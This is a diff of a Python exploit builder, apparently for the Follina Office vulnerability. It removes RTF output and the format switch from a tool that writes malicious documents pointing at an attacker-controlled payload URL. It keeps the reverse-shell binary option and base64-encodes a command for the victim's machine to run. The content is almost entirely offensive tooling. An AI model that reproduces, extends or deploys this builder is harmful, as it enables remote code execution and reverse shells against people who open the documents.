@@ -32,18 +32,6 @@ def generate_docx(payload_url, docx_name):
 
     print(f"Generated {docx_name}")
 
-def generate_rtf(payload_url, rtf_name):
-
-    with open("src/rtf.template", "r") as f:
-        template = f.read()
-
-    payload = template.replace("{payload_url}", payload_url)
-
-    with open(f"output/{rtf_name}", "w") as f:
-        f.write(payload)
-
-    print(f"Generated {rtf_name}")
-
 def generate_html(command):
 
     with open("src/html.template", "r") as f:
@@ -78,10 +66,6 @@ def __main__():
         help = "Docx output file"
     )
 
-    optional.add_argument("-f", "--format", action="store", dest="format", default="docx",
-        help = "Choose if you want docx or rtf file"
-    )
-
     optional.add_argument("-r", "--reverse", action="store", dest="reverse", 
         help = "Reverse shell binary"
     )
@@ -110,19 +94,6 @@ def __main__():
             raise SystemExit(f"Can't find the following file: {args.file}")
 
     payload_url = f"http://{args.host}:{args.port}/index.html"
-
-    if args.format == "docx":
-        generate_docx(payload_url, args.output)
-
-    elif args.format == "rtf":
-        if args.output == "follina.docx":
-            generate_rtf(payload_url, "follina.rtf")
-
-        else:
-            generate_rtf(payload_url, args.output)
-
-    else:
-        raise SystemExit("Please use a valid format")
 
     parsed_command = base64.b64encode(bytearray(command, 'utf-16-le')).decode('utf-8')
 
